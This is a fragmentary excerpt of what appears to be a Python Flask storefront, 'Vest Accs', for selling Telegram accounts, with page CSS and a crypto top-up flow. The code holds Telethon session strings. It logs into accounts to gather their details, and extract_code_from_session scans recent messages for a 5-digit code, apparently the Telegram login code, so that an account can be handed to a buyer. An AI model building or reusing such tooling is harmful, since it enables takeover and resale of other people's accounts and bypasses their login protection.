...
.sidebar{position:fixed;top:0;right:-260px;width:240px;height:100vh;background:rgba(10,10,20,0.98);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);border-left:1px solid rgba(255,255,255,0.06);z-index:250;transition:0.3s ease;padding:70px 14px 14px;display:flex;flex-direction:column;gap:3px;overflow-y:auto}
.sidebar.open{right:0}
.sidebar a{display:flex;align-items:center;gap:8px;padding:10px 12px;color:#cbd5e1;text-decoration:none;border-radius:8px;font-weight:500;transition:0.2s;font-size:13px}
.sidebar a:hover{background:rgba(99,102,241,0.1);color:#fff}
.sidebar .divider{height:1px;background:rgba(255,255,255,0.06);margin:3px 0}
...
@media(max-width:768px){.grid{grid-template-columns:1fr}.page-title{font-size:24px}.sidebar{width:220px}.filter-grid{grid-template-columns:1fr}}
</style>'''
...
# --- Подключение к Telethon для сбора данных ---
...
def gather_account_data(session_string):
    """Сбор данных аккаунта с быстрым отключением"""
    ...
    try:
        ...
        try:
            me = client.get_me()
            data['is_premium'] = getattr(me, 'premium', False)
        except: pass
...
def extract_code_from_session(session_string):
    """Извлечение 5-значного кода из последних сообщений"""
    client = quick_connect(session_string)
    ...
    try:
        ...
        for dialog in dialogs:
            try:
                messages = client.get_messages(dialog, limit=5)
                for msg in messages:
                    if msg.message:
...
def deposit():
    if request.method == 'POST':
        ...
        if amount < 20: flash('Минимум 20 ₽', 'error')
            ...
            try:
                r = requests.get(f"https://pay.crypt.bot/api/createInvoice?api_key={CRYPTO_TOKEN}&asset=USDT&amount={amount/90:.2f}&description=Vest Accs пополнение&allow_comments=false", timeout=10)
                data = r.json()
                if data.get('ok'):
                    db = get_db()
                    with db.cursor() as cur: cur.execute("INSERT INTO crypto_invoices (user_id, invoice_id, amount_rub) VALUES (%s,%s,%s)", (g.user['id'], data['result']['invoice_id'], amount))
...
def crypto_callback():
    try:
        ...
        if data.get('status') == 'paid':
            db = get_db()
            with db.cursor(cursor_factory=psycopg2.extras.DictCursor) as cur:
                cur.execute("SELECT * FROM crypto_invoices WHERE invoice_id = %s AND status = 'pending'", (data['invoice_id'],))
                inv = cur.fetchone()
                if inv:
                    ...
                    cur.execute("UPDATE crypto_invoices SET status = 'paid' WHERE invoice_id = %s", (data['invoice_id'],))
